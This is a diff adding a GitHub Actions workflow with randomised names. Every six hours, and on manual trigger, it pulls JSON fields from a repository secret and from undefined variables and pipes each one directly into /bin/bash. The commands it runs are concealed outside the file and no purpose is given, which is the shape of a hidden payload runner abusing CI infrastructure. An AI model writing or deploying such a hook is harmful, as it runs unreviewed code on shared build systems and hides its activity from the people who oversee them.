@@ -1,0 +1,21 @@
+name: zhuqingliu2345
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuqingliu2345
+        env:
+          a947: ${{ secrets.a947 }}
+        run: |
+          echo $a947 | jq -r .eehzp37208 | /bin/bash
+          echo $sda5208 | jq -r .nt37894 | /bin/bash
+          echo $vu2140 | jq -r .rcmdl8 | /bin/bash
+          echo $klqam15 | jq -r .arl010 | /bin/bash
+          echo $r7 | jq -r .mawg0 | /bin/bash
+
